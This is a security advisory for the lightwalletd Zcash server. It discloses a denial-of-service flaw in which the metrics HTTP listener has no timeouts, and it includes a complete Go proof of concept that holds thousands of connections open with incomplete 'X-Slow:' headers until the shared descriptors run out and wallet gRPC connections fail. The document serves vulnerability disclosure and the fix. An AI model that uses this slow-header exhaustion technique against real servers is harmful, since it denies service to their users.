# GHSA-w24w-x7vw-f2w8: Timeout-free metrics HTTP listener permits Slowloris descriptor exhaustion and denial of wallet gRPC service

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-w24w-x7vw-f2w8 |
| CVE | none assigned |
| Severity | medium |
| CWE | CWE-400 |
| Published | 2026-11-18T00:38:20Z |
| Updated | 2026-11-18T01:03:02Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-w24w-x7vw-f2w8 |

## Description (verbatim)

### Summary


lightwalletd starts its Prometheus HTTP listener with `http.ListenAndServe(opts.HTTPBindAddr, nil)`. The resulting zero-valued `http.Server` gives incomplete request headers an unlimited read duration and applies the default connection admission behavior. A network peer that can reach the separately configured metrics listener can hold each TCP connection after an HTTP request prefix, retaining one process file descriptor and HTTP goroutine indefinitely.

The metrics and wallet gRPC listeners share one process and descriptor budget. In an isolated local child process with a 128-FD soft limit, incomplete metrics headers prevented a new honest production `GetBlock` gRPC connection. The same request succeeded after the slow connections were released.

This finding applies when the metrics listener accepts connections from an untrusted network. The bare-binary default and checked-in Compose host publication use loopback. The deployment guide separately documents publishing the HTTP port on `0.0.0.0`, including whole-Internet exposure.

### Details


### Attacker and reachability

The attacker is any untrusted network peer that can connect to the configured HTTP metrics listener. The trigger consists of an ordinary incomplete HTTP request header, so the caller acts as an unprivileged metrics peer and reaches the vulnerable read before Prometheus request handling.

Reachability is a required premise:

- CLI default: `127.0.0.1:9068`.
- Checked-in Compose command: listener binds `0.0.0.0` inside the container, while the default host publication is `127.0.0.1`.
- Deployment guide: shows `0.0.0.0:$LWD_HTTP_PORT` publication and states this can expose lightwalletd to the whole Internet.

Wallet gRPC and metrics use separate bind addresses. Remote applicability follows the metrics bind and host publication. A review policy that limits scope to the loopback defaults will classify this finding as deployment-conditional.

### Root cause

```go
// cmd/root.go
func startHTTPServer(opts *common.Options) {
    http.Handle("/metrics", promhttp.Handler())
    http.ListenAndServe(opts.HTTPBindAddr, nil)
}
```

The package helper constructs a zero-valued `http.Server`, giving an incomplete header a client-controlled read lifetime. The connection stays in HTTP header parsing before the Prometheus handler. The HTTP and gRPC listeners share one process descriptor table, so metrics-side descriptor exhaustion blocks new wallet connections as well.


### Proof of concept


### Safety and isolation

This PoC is local and uses loopback or in-memory connections. Its first phase models the production timeout-free `net/http` server with `net.Pipe`. Its second phase starts a child process with an isolated soft file-descriptor limit and local Unix sockets, demonstrates cross-listener descriptor exhaustion, releases the connections, and verifies recovery. All traffic stays inside the local reproduction environment.

### Requirements

- Go matching the repository's `go.mod`
- A checkout of commit `d16d48124e9ad4157ebc2324b5090c6ba201470c` (`v0.5.5`)

### Reproduction

1. Check out lightwalletd v0.5.5.
2. Create a new `poc` directory at the repository root.
3. Save the complete source shown below using the indicated filenames.
4. From the repository root, run:

```sh
go run ./poc
```

The program verifies the affected `http.ListenAndServe` call, retains 4,096 incomplete headers for two seconds in the in-memory phase, and then runs `isolated_fd.go` as a child under a 128-descriptor soft limit. Slow metrics connections consume the shared process descriptor table; a new honest gRPC connection fails during exhaustion and succeeds after release.

### Complete PoC source

#### `poc/main.go`

```go
package main

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	connectionCount = 4096
	retentionDwell  = 2 * time.Second
)

type countingListener struct {
	net.Listener
	active atomic.Int64
}

type countedConn struct {
	net.Conn
	active *atomic.Int64
	closed atomic.Bool
}

type memoryAddr string

func (a memoryAddr) Network() string { return "memory" }
func (a memoryAddr) String() string  { return string(a) }

type memoryListener struct {
	connections chan net.Conn
	done        chan struct{}
	closeOnce   sync.Once
}

func newMemoryListener() *memoryListener {
	return &memoryListener{
		connections: make(chan net.Conn, connectionCount),
		done:        make(chan struct{}),
	}
}

func (l *memoryListener) Accept() (net.Conn, error) {
	select {
	case conn := <-l.connections:
		return conn, nil
	case <-l.done:
		return nil, net.ErrClosed
	}
}

func (l *memoryListener) Close() error {
	l.closeOnce.Do(func() { close(l.done) })
	return nil
}

func (l *memoryListener) Addr() net.Addr { return memoryAddr("metrics-poc") }

func (l *countingListener) Accept() (net.Conn, error) {
	c, err := l.Listener.Accept()
	if err != nil {
		return nil, err
	}
	l.active.Add(1)
	return &countedConn{Conn: c, active: &l.active}, nil
}

func (c *countedConn) Close() error {
	if c.closed.CompareAndSwap(false, true) {
		c.active.Add(-1)
	}
	return c.Conn.Close()
}

func waitForCount(counter *atomic.Int64, want int64, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if counter.Load() == want {
			return true
		}
		time.Sleep(10 * time.Millisecond)
	}
	return counter.Load() == want
}

func mibDelta(after, before uint64) float64 {
	return float64(int64(after)-int64(before)) / (1024 * 1024)
}

func main() {
	if runMetricsChildIfRequested() {
		return
	}

	source, err := os.ReadFile("cmd/root.go")
	if err != nil {
		panic(err)
	}
	needle := []byte("http.ListenAndServe(opts.HTTPBindAddr, nil)")
	if !bytes.Contains(source, needle) {
		fmt.Fprintln(os.Stderr, "target source no longer contains the vulnerable ListenAndServe call")
		os.Exit(1)
	}
	fmt.Println("source check: timeout-free http.ListenAndServe call is present")

	base := newMemoryListener()
	listener := &countingListener{Listener: base}
	// This is the Server configuration constructed internally by the target's
	// http.ListenAndServe(addr, nil): all timeout fields are zero.
	server := &http.Server{}
	go func() {
		_ = server.Serve(listener)
	}()

	runtime.GC()
	baselineGoroutines := runtime.NumGoroutine()
	var before runtime.MemStats
	runtime.ReadMemStats(&before)
	connections := make([]net.Conn, 0, connectionCount)
	for i := 0; i < connectionCount; i++ {
		serverConn, conn := net.Pipe()
		base.connections <- serverConn
		// Deliberately omit the terminating CRLF. The request never reaches a
		// handler and has no source-level deadline.
		if _, err := conn.Write([]byte("GET /metrics HTTP/1.1\r\nHost: localhost\r\nX-Slow: ")); err != nil {
			fmt.Fprintf(os.Stderr, "write %d: %v\n", i, err)
			os.Exit(1)
		}
		connections = append(connections, conn)
	}

	if !waitForCount(&listener.active, connectionCount, 10*time.Second) {
		fmt.Fprintf(os.Stderr, "PoC failed: expected %d retained connections, got %d\n", connectionCount, listener.active.Load())
		os.Exit(1)
	}
	// Send no bytes during this dwell. ReadHeaderTimeout would release these
	// connections; the target's zero-valued server keeps all of them.
	time.Sleep(retentionDwell)
	if listener.active.Load() != connectionCount {
		fmt.Fprintf(os.Stderr, "PoC failed: connections did not remain retained: want=%d got=%d\n", connectionCount, listener.active.Load())
		os.Exit(1)
	}
	runtime.GC()
	afterGoroutines := runtime.NumGoroutine()
	var after runtime.MemStats
	runtime.ReadMemStats(&after)
	fmt.Printf("incomplete headers retained: %d\n", listener.active.Load())
	fmt.Printf("zero-traffic retention dwell: %s\n", retentionDwell)
	fmt.Printf("goroutines: before=%d after=%d delta=%d\n", baselineGoroutines, afterGoroutines, afterGoroutines-baselineGoroutines)
	fmt.Printf("in-process retained memory deltas: heap=%.1f MiB stack=%.1f MiB sys=%.1f MiB\n",
		mibDelta(after.HeapAlloc, before.HeapAlloc),
		mibDelta(after.StackInuse, before.StackInuse),
		mibDelta(after.Sys, before.Sys))
	var fileLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &fileLimit); err == nil {
		fmt.Printf("process soft file-descriptor limit: %d (a real TCP trigger retains one server descriptor per connection)\n", fileLimit.Cur)
	}

	for _, conn := range connections {
		_ = conn.Close()
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	_ = server.Shutdown(ctx)

	if err := runIsolatedFDExhaustion(); err != nil {
		fmt.Fprintf(os.Stderr, "isolated FD-exhaustion proof failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("IMPACT CONFIRMED: incomplete metrics headers exhausted an isolated process FD budget and denied a new honest gRPC connection")
}
```

#### `poc/isolated_fd.go`

```go
package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/zcash/lightwalletd/common"
	"github.com/zcash/lightwalletd/frontend"
	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

const (
	metricsChildFlag = "LWD_METRICS_FD_CHILD"
	metricsChildDir  = "LWD_METRICS_FD_DIR"
	childFDLimit     = 128
)

func runMetricsChildIfRequested() bool {
	if os.Getenv(metricsChildFlag) != "1" {
		return false
	}
	if err := runMetricsChild(os.Getenv(metricsChildDir)); err != nil {
		fmt.Fprintf(os.Stderr, "metrics child failed: %v\n", err)
		os.Exit(2)
	}
	return true
}

func runMetricsChild(dir string) error {
	common.Log = logrus.New().WithField("component", "metrics-fd-child")
	common.Log.Logger.SetOutput(io.Discard)

	cache := common.NewBlockCache(filepath.Join(dir, "cache"), "unittestnet", 1, 0)
	defer cache.Close()
	if err := cache.Add(1, &walletrpc.CompactBlock{Height: 1, Hash: make([]byte, 32)}); err != nil {
		return err
	}
	service, err := frontend.NewLwdStreamer(cache, "main", false)
	if err != nil {
		return err
	}

	metricsSocket := filepath.Join(dir, "metrics.sock")
	grpcSocket := filepath.Join(dir, "grpc.sock")
	metricsListener, err := net.Listen("unix", metricsSocket)
	if err != nil {
		return err
	}
	defer metricsListener.Close()
	grpcListener, err := net.Listen("unix", grpcSocket)
	if err != nil {
		return err
	}
	defer grpcListener.Close()

	mux := http.NewServeMux()
	mux.HandleFunc("/metrics", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	httpServer := &http.Server{
		Handler:  mux,
		ErrorLog: log.New(io.Discard, "", 0),
	}
	grpcServer := grpc.NewServer()
	walletrpc.RegisterCompactTxStreamerServer(grpcServer, service)

	var fdLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &fdLimit); err != nil {
		return err
	}
	if fdLimit.Cur < childFDLimit {
		return fmt.Errorf("existing FD limit %d is below test limit %d", fdLimit.Cur, childFDLimit)
	}
	fdLimit.Cur = childFDLimit
	if err := syscall.Setrlimit(syscall.RLIMIT_NOFILE, &fdLimit); err != nil {
		return err
	}

	go func() { _ = httpServer.Serve(metricsListener) }()
	go func() { _ = grpcServer.Serve(grpcListener) }()
	if err := os.WriteFile(filepath.Join(dir, "ready"), []byte("ready"), 0o600); err != nil {
		return err
	}

	interrupts := make(chan os.Signal, 1)
	signal.Notify(interrupts, os.Interrupt, syscall.SIGTERM)
	<-interrupts
	grpcServer.Stop()
	_ = httpServer.Close()
	return nil
}

func callHonestGRPC(socket string, timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	conn, err := grpc.NewClient(
		"passthrough:///isolated-lightwalletd",
		grpc.WithContextDialer(func(ctx context.Context, _ string) (net.Conn, error) {
			var dialer net.Dialer
			return dialer.DialContext(ctx, "unix", socket)
		}),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	)
	if err != nil {
		return err
	}
	defer conn.Close()
	_, err = walletrpc.NewCompactTxStreamerClient(conn).GetBlock(ctx, &walletrpc.BlockID{Height: 1})
	return err
}

func stopChild(cmd *exec.Cmd, done <-chan error) {
	if cmd.Process == nil || cmd.ProcessState != nil {
		return
	}
	_ = cmd.Process.Signal(os.Interrupt)
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		_ = cmd.Process.Kill()
		<-done
	}
}

func runIsolatedFDExhaustion() error {
	dir, err := os.MkdirTemp("/tmp", "lwd-metrics-fd-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(dir)

	executable, err := os.Executable()
	if err != nil {
		return err
	}
	cmd := exec.Command(executable)
	cmd.Env = append(os.Environ(), metricsChildFlag+"=1", metricsChildDir+"="+dir)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		return err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	defer stopChild(cmd, done)

	ready := filepath.Join(dir, "ready")
	deadline := time.Now().Add(5 * time.Second)
	for {
		if _, err := os.Stat(ready); err == nil {
			break
		}
		select {
		case err := <-done:
			return fmt.Errorf("child exited before readiness: %w", err)
		default:
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("child readiness timeout")
		}
		time.Sleep(10 * time.Millisecond)
	}

	grpcSocket := filepath.Join(dir, "grpc.sock")
	metricsSocket := filepath.Join(dir, "metrics.sock")
	if err := callHonestGRPC(grpcSocket, time.Second); err != nil {
		return fmt.Errorf("baseline honest gRPC request failed: %w", err)
	}

	connections := make([]net.Conn, 0, childFDLimit*3)
	defer func() {
		for _, conn := range connections {
			_ = conn.Close()
		}
	}()
	for i := 0; i < childFDLimit*3; i++ {
		conn, err := net.DialTimeout("unix", metricsSocket, 25*time.Millisecond)
		if err != nil {
			continue
		}
		_ = conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond))
		if _, err := conn.Write([]byte("GET /metrics HTTP/1.1\r\nHost: local\r\nX-Slow: ")); err != nil {
			_ = conn.Close()
			continue
		}
		connections = append(connections, conn)
	}
	if len(connections) < childFDLimit/2 {
		return fmt.Errorf("only %d slow connections opened", len(connections))
	}
	time.Sleep(300 * time.Millisecond)

	denialStarted := time.Now()
	denialErr := callHonestGRPC(grpcSocket, 750*time.Millisecond)
	if denialErr == nil {
		return fmt.Errorf("honest gRPC request unexpectedly succeeded after metrics FD exhaustion")
	}
	denialElapsed := time.Since(denialStarted)
	fmt.Printf("isolated child FD limit: %d\n", childFDLimit)
	fmt.Printf("slow metrics connections held by parent: %d\n", len(connections))
	fmt.Printf("honest new gRPC connection under FD exhaustion: failed after %s: %v\n", denialElapsed.Round(time.Millisecond), denialErr)

	for _, conn := range connections {
		_ = conn.Close()
	}
	connections = nil
	recoveryDeadline := time.Now().Add(8 * time.Second)
	for {
		if err := callHonestGRPC(grpcSocket, time.Second); err == nil {
			fmt.Println("honest gRPC request after releasing slow connections: success")
			return nil
		}
		if time.Now().After(recoveryDeadline) {
			return fmt.Errorf("honest gRPC request did not recover after slow connections closed")
		}
		time.Sleep(250 * time.Millisecond)
	}
}
```

### Observed output

The following is the complete output retained from the successful v0.5.5 run described above (timestamps and ephemeral port numbers may vary):

```text
source check: timeout-free http.ListenAndServe call is present
incomplete headers retained: 4096
zero-traffic retention dwell: 2s
goroutines: before=2 after=4098 delta=4096
in-process retained memory deltas: heap=47.4 MiB stack=32.2 MiB sys=82.9 MiB
process soft file-descriptor limit: 184320 (a real TCP trigger retains one server descriptor per connection)
isolated child FD limit: 128
slow metrics connections held by parent: 247
honest new gRPC connection under FD exhaustion: failed after 0s: rpc error: code = Unavailable desc = connection error: desc = "transport: failed to write client preface: write unix -><temporary-dir>/grpc.sock: write: broken pipe"
honest gRPC request after releasing slow connections: success
IMPACT CONFIRMED: incomplete metrics headers exhausted an isolated process FD budget and denied a new honest gRPC connection
```

The child-process result proves the impact for a metrics listener reachable by an untrusted client. The bare binary and checked-in host deployment defaults bind metrics to loopback. External reachability is therefore a separate deployment prerequisite stated throughout this report.


### Impact


This is a cross-listener service DoS for deployments that make the metrics HTTP listener reachable by an untrusted peer. The local reproduction exhausted a finite process resource, caused an unrelated honest wallet gRPC connection to fail, and demonstrated recovery when the attacker-held connections were released.

The attacker keeps TCP connections open while sending minimal traffic after the initial prefixes. The required count depends on the process FD limit and existing descriptor use. Remote impact applies to metrics listeners published to untrusted networks; loopback and trusted-management-network deployments retain their local trust boundary.

### Fix

Fixed in 0.6.2. The metrics listener now sets `ReadHeaderTimeout` (10 seconds) along with read, write and idle timeouts, so an incomplete request can't hold a connection open indefinitely. This bounds how long each connection is held. It doesn't rate-limit new connections, so a sustained flood can still use up descriptors, and the metrics port should still not be exposed to untrusted networks.

